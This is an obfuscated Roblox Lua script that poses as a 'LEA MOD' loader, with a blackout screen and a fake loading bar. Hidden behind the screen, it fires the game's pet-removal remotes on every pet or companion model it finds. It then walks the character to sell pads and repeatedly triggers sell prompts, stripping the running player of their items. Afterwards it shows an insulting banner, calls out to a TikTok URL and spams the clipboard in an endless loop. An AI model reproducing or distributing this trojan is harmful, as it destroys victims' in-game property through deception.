local function d(e)local f=""for g=1,#e do f=f..string.char(e[g])end return f end
local a={}
a[1]={71,101,116,83,101,114,118,105,99,101}
a[2]={80,108,97,121,101,114,115}
a[3]={82,117,110,83,101,114,118,105,99,101}
a[4]={84,119,101,101,110,83,101,114,118,105,99,101}
a[5]={82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101}
a[6]={85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101}
a[7]={80,97,116,104,102,105,110,100,105,110,103,83,101,114,118,105,99,101}
local b=game[d(a[1])]
local c=b[d(a[2])]
local d1=b[d(a[3])]
local e1=b[d(a[4])]
local f1=b[d(a[5])]
local g1=b[d(a[6])]
local h1=b[d(a[7])]
local i1=c.LocalPlayer
local j1=i1.Character or i1.CharacterAdded:Wait()
local k1=j1:WaitForChild(d({72,117,109,97,110,111,105,100}))
local l1=j1:WaitForChild(d({72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116}))
local m1=b[d({67,111,114,101,71,117,105})]
if m1:FindFirstChild(d({76,69,65,77,111,100,76,111,99,107,100,111,119,110}))then
m1[d({76,69,65,77,111,100,76,111,99,107,100,111,119,110})]:Destroy()
end
local n1=Instance.new(d({83,99,114,101,101,110,71,117,105}))
n1.Name=d({76,69,65,77,111,100,76,111,99,107,100,111,119,110})
n1.IgnoreGuiInset=true
n1.ResetOnSpawn=false
n1.ZIndexBehavior=Enum.ZIndexBehavior.Global
if syn and syn.protect_gui then
syn.protect_gui(n1)
n1.Parent=m1
elseif gethui then
n1.Parent=gethui()
else
n1.Parent=m1
end
local o1=Instance.new(d({70,114,97,109,101}))
o1.Name=d({66,108,97,99,107,111,117,116,70,114,97,109,101})
o1.Size=UDim2.new(1,0,1,0)
o1.BackgroundColor3=Color3.fromRGB(0,0,0)
o1.BorderSizePixel=0
o1.ZIndex=999
o1.Parent=n1
local p1=Instance.new(d({70,114,97,109,101}))
p1.Name=d({76,111,97,100,101,114,67,111,110,116,97,105,110,101,114})
p1.Size=UDim2.new(0,420,0,160)
p1.Position=UDim2.new(0.5,-210,0.5,-80)
p1.BackgroundColor3=Color3.fromRGB(15,15,22)
p1.BorderSizePixel=0
p1.ZIndex=1000
p1.Parent=n1
local q1=Instance.new(d({85,73,67,111,114,110,101,114}))
q1.CornerRadius=UDim.new(0,10)
q1.Parent=p1
local r1=Instance.new(d({85,73,83,116,114,111,107,101}))
r1.Color=Color3.fromRGB(0,255,204)
r1.Thickness=1.5
r1.ZIndex=1000
r1.Parent=p1
local s1=Instance.new(d({84,101,120,116,76,97,98,101,108}))
s1.Size=UDim2.new(1,0,0,40)
s1.BackgroundTransparency=1
s1.Font=Enum.Font.GothamBold
s1.Text=d({76,69,65,32,77,79,68})
s1.TextColor3=Color3.fromRGB(0,255,204)
s1.TextSize=20
s1.ZIndex=1000
s1.Parent=p1
local t1=Instance.new(d({70,114,97,109,101}))
t1.Size=UDim2.new(0.85,0,0,18)
t1.Position=UDim2.new(0.075,0,0.55,0)
t1.BackgroundColor3=Color3.fromRGB(25,25,35)
t1.BorderSizePixel=0
t1.ZIndex=1000
t1.Parent=p1
local u1=Instance.new(d({85,73,67,111,114,110,101,114}))
u1.CornerRadius=UDim.new(1,0)
u1.Parent=t1
local v1=Instance.new(d({70,114,97,109,101}))
v1.Size=UDim2.new(0,0,1,0)
v1.BackgroundColor3=Color3.fromRGB(0,255,204)
v1.BorderSizePixel=0
v1.ZIndex=1000
v1.Parent=t1
local w1=Instance.new(d({85,73,67,111,114,110,101,114}))
w1.CornerRadius=UDim.new(1,0)
w1.Parent=v1
local x1=Instance.new(d({84,101,120,116,76,97,98,101,108}))
x1.Size=UDim2.new(1,0,0,25)
x1.Position=UDim2.new(0,0,0.78,0)
x1.BackgroundTransparency=1
x1.Font=Enum.Font.Gotham
x1.Text=d({83,99,114,105,112,116,32,108,111,97,100,105,110,103,46,46,46})
x1.TextColor3=Color3.fromRGB(180,180,200)
x1.TextSize=13
x1.ZIndex=1000
x1.Parent=p1
local function y1()
local z1={d({82,101,109,111,118,101,80,101,116}),d({68,101,108,101,116,101,80,101,116}),d({68,101,115,112,97,119,110,80,101,116}),d({82,101,109,111,118,101,67,111,109,112,97,110,105,111,110}),d({80,101,116,83,121,115,116,101,109}),d({68,101,108,101,116,101,66,108,111,99,107}),d({82,101,109,111,118,101,66,108,111,99,107})}
for _,A1 in ipairs(z1)do
local B1=f1:FindFirstChild(A1,true)
if B1 and(B1:IsA(d({82,101,109,111,116,101,69,118,101,110,116}))or B1:IsA(d({82,101,109,111,116,101,70,117,110,99,116,105,111,110})))then
return B1
end
end
for _,C1 in ipairs(f1:GetDescendants())do
if(C1:IsA(d({82,101,109,111,116,101,69,118,101,110,116}))or C1:IsA(d({82,101,109,111,116,101,70,117,110,99,116,105,111,110})))then
local D1=string.lower(C1.Name)
if string.find(D1,d({112,101,116}))or string.find(D1,d({114,101,109,111,118,101}))or string.find(D1,d({100,101,108,101,116,101}))then
return C1
end
end
end
return nil
end
local E1=false
local function F1()
local G1=y1()
local H1={d({112,101,116}),d({98,114,97,105,110,114,111,116}),d({99,111,109,112,97,110,105,111,110}),d({97,110,105,109,97,108}),d({102,111,108,108,111,119,101,114}),d({109,105,110,105,111,110})}
local function I1(J1)
local K1=string.lower(J1)
for _,L1 in ipairs(H1)do
if string.find(K1,L1,1,true)then
return true
end
end
return false
end
local M1={workspace,i1:FindFirstChild(d({66,97,99,107,112,97,99,107})),i1.Character,m1}
for _,N1 in ipairs(M1)do
if N1 then
for _,O1 in ipairs(N1:GetDescendants())do
pcall(function()
if O1:IsA(d({77,111,100,101,108}))or O1:IsA(d({66,97,115,101,80,97,114,116}))then
local P1=O1:IsA(d({77,111,100,101,108}))and O1 or O1:FindFirstAncestorOfClass(d({77,111,100,101,108}))
if P1 and I1(P1.Name)then
if G1 then
if G1:IsA(d({82,101,109,111,116,101,69,118,101,110,116}))then
G1:FireServer(P1)
elseif G1:IsA(d({82,101,109,111,116,101,70,117,110,99,116,105,111,110}))then
G1:InvokeServer(P1)
end
end
P1:Destroy()
end
end
end)
end
end
end
end
local function Q1()
local R1=nil
local S1=math.huge
if not l1 then return nil end
for _,T1 in ipairs(workspace:GetDescendants())do
if T1:IsA(d({66,97,115,101,80,97,114,116}))and(T1.Name:lower():find(d({112,97,100}))or T1.Name:lower():find(d({115,101,108,108}))or T1.Name:lower():find(d({115,116,97,110,100}))or T1.Name:lower():find(d({98,97,115,101})))then
local U1=(l1.Position-T1.Position).Magnitude
if U1<S1 and U1<30 then
S1=U1
R1=T1
end
end
end
return R1
end
local function V1()
local W1=false
for _,X1 in ipairs(workspace:GetDescendants())do
if X1:IsA(d({80,114,111,120,105,109,105,116,121,80,114,111,109,112,116}))then
local Y1=string.lower(X1.ActionText or"")
local Z1=string.lower(X1.Name or"")
if Y1:find(d({115,97,116}))or Y1:find(d({115,101,108,108}))or Z1:find(d({115,97,116}))or Z1:find(d({115,101,108,108}))then
pcall(function()
for a2=1,5 do
fireproximityprompt(X1)
task.wait()
end
end)
W1=true
end
elseif X1:IsA(d({67,108,105,99,107,68,101,116,101,99,116,111,114}))then
pcall(function()
for b2=1,5 do
fireclickdetector(X1)
task.wait()
end
end)
W1=true
end
end
return W1
end
task.spawn(function()
local c2=e1:Create(v1,TweenInfo.new(4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(0.999,0,1,0)})
c2:Play()
local d2=tick()
while tick()-d2<4.5 do
F1()
task.wait(0.1)
end
v1.Size=UDim2.new(0.999,0,1,0)
for e2=1,10 do
F1()
task.wait(0.2)
end
E1=true
p1:Destroy()
local f2=Instance.new(d({70,114,97,109,101}))
f2.Size=UDim2.new(1,0,1,0)
f2.BackgroundColor3=Color3.fromRGB(10,10,15)
f2.BorderSizePixel=0
f2.ZIndex=1000
f2.Parent=n1
local g2=Instance.new(d({84,101,120,116,76,97,98,101,108}))
g2.Size=UDim2.new(1,0,0,100)
g2.Position=UDim2.new(0,0,0.4,-50)
g2.BackgroundTransparency=1
g2.Font=Enum.Font.FredokaOne
g2.Text=d({76,69,65,32,70,85,67,75,69,68,32,89,79,85,82,32,77,79,77})
g2.TextColor3=Color3.fromRGB(255,0,0)
g2.TextSize=38
g2.ZIndex=1000
g2.Parent=f2
local h2=Instance.new(d({84,101,120,116,76,97,98,101,108}))
h2.Size=UDim2.new(1,0,0,30)
h2.Position=UDim2.new(0,0,0.6,0)
h2.BackgroundTransparency=1
h2.Font=Enum.Font.Code
h2.Text=d({74,97,105,108,98,114,101,97,107,32,76,101,102,116,101,114,52,68,101,97,100,32,116,97,114,97,102,305,110,100,97,110,32,77,111,100,108,97,110,109,305,351,116,305,114,32,47,47,32,84,304,75,84,79,75,32,64,76,69,65,80,76,85,83})
h2.TextColor3=Color3.fromRGB(0,255,204)
h2.TextSize=14
h2.ZIndex=1000
h2.Parent=f2
pcall(function()
if request then
request({Url=d({104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47}),Method=d({71,69,84})})
elseif syn and syn.request then
syn.request({Url=d({104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47}),Method=d({71,69,84})})
elseif http and http.request then
http.request({Url=d({104,116,116,112,115,58,47,47,118,116,46,116,105,107,116,111,107,46,99,111,109,47,90,83,57,114,118,75,66,113,66,101,69,81,69,45,57,105,108,70,86,47}),Method=d({71,69,84})})
end
end)
task.spawn(function()
local i2=0
while true do
i2=(i2+0.01)%1
g2.TextColor3=Color3.fromHSV(i2,1,1)
task.wait(0.05)
end
end)
end)
task.spawn(function()
while true do
if E1 then
F1()
pcall(function()
if l1 and k1 then
local j2=Q1()
if j2 then
k1:MoveTo(j2.Position)
end
end
if not V1()then
for _,k2 in ipairs(workspace:GetDescendants())do
if k2:IsA(d({80,114,111,120,105,109,105,116,121,80,114,111,109,112,116}))then
for l2=1,5 do
fireproximityprompt(k2)
task.wait()
end
end
end
end
end)
end
task.wait(1)
end
end)
task.spawn(function()
local m2=0
while true do
pcall(function()
if setclipboard then
m2=m2+1
setclipboard(d({84,304,75,84,79,75,32,64,76,69,65,80,76,85,83,32})..m2)
end
end)
task.wait(0.1)
end
end)
